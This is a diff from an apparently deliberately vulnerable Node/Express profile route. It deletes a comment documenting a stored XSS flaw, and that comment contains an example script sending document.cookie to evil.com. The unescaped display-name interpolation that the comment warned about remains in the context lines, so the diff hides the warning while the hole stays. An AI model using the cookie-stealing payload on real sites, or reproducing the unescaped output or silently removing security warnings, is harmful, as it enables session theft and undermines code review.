@@ -25,22 +25,6 @@ router.get('/profile/:username', async (req, res) => {
 
     const profile = user[0];
 
-    // -------------------------------------------------------
-    // VULNERABILITY: CVE-2023-0003 (HIGH — 7.5)
-    // Cross-Site Scripting (XSS)
-    //
-    // The user's display name and bio are inserted directly
-    // into the HTML without being sanitized or escaped.
-    //
-    // An attacker could set their display name to something
-    // like: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
-    //
-    // When ANY other user views this profile, the script runs
-    // in their browser, stealing their session token.
-    //
-    // Combined with CVE-2023-0009 (non-expiring tokens),
-    // a stolen token gives permanent account access.
-    // -------------------------------------------------------
     const html = `
       <html>
         <head><title>${profile.display_name} — Connector</title></head>
